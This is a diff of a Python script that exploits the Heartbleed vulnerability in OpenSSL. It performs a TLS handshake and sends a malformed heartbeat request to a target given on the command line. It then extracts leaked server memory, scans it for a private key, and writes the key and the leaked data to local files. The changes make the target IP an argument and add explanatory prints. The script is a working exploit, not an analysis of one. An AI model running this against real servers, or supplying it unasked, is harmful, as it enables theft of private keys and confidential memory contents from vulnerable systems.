@@ -2,15 +2,16 @@
 #coding: utf-8
 import socket
 import struct
+import sys
 
 def hex2bin(arr):
     long_hex_string =  ''.join('{:02x}'.format(x) for x in arr)
     return bytes.fromhex(long_hex_string)
 
 '''
-	Found this request format in the internet
-'''    
- 
+	Found this TLS request in the internet
+'''
+
 client_tls_hello = [
 # TLS header ( 5 bytes)
 0x16,               # Content type (0x16 for handshake)
@@ -60,6 +61,10 @@ client_tls_hello = [
 0x00, 0x0f, 0x00, 0x01, 0x01
 ]
 
+'''
+	special heartbeat request to perform heartbleed
+'''
+
 heartbeat_request = [
 0x18,       # Content Type (Heartbeat)
 0x03, 0x02,  # TLS version
@@ -74,11 +79,10 @@ def heartbeat(socket):
     # send heartbeat request to the server
     socket.send(hex2bin(heartbeat_request))
 
-    #start listening the answer from the server
     while True:
 
         header = socket.recv(5)
-        (content_type, version, length) = struct.unpack('>BHH', header) 
+        (content_type, version, length) = struct.unpack('>BHH', header)
         # we can't use s.recv(length) because the server can separate the packet heartbeat into different smaller packet
         pay = recvall(socket,length)
         if pay is None:
@@ -92,7 +96,7 @@ def heartbeat(socket):
                 print ('WARNING: server returned more data than it should - server is vulnerable!')
                 if b'END PRIVATE KEY' in pay:
                     print('Found private key')
-                    
+
                     str_pay = str(pay)
                     key_header = '-----BEGIN PRIVATE KEY-----'
                     key_footer = '-----END PRIVATE KEY-----'
@@ -101,18 +105,19 @@ def heartbeat(socket):
                     private_key = str_pay[start:end]
                     private_key = key_header + '\n' + private_key[private_key.find(key_header) + len(key_header) : private_key.find(key_footer)] + '\n' + key_footer
                     f = open("private_key.txt", "w+")
-                    f.write(private_key) 
+                    f.write(private_key)
                     f.close()
                     f = open("leaked_data.txt", "w+")
                     f.write(str_pay)
-                    f.close() 
+                    f.close()
                     print(private_key)
+                    print('the private key was writen to file \'private_key.txt\' and the whole leaked data to \'leaked_data.txt\'')
             else:
                 print('Server processed but did not return extra data.')
             return True
-    
-        
-    return False 
+
+
+    return False
 
 
 """from https://stackoverflow.com/questions/17667903/python-socket-receive-large-amount-of-data """
@@ -126,11 +131,13 @@ def recvall(sock, n):
         data += packet
     return data
 
+
+ip = sys.argv[-1]
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-socket.connect(('10.0.23.19', 443))
+socket.connect((ip, 443))
 
 socket.send(hex2bin(client_tls_hello))
-# pass the handshake
+# after handshake
 while True:
     header = socket.recv(5)
     (content_type, version, length) = struct.unpack('>BHH', header)
@@ -138,7 +145,7 @@ while True:
     # Look for server hello done message.
     if content_type == 22 and handshake[0] == 0x0E:
         break
-        
+
 print('Handshake ok')
 print('Sending  especial heartbeat')
 heartbeat(socket)
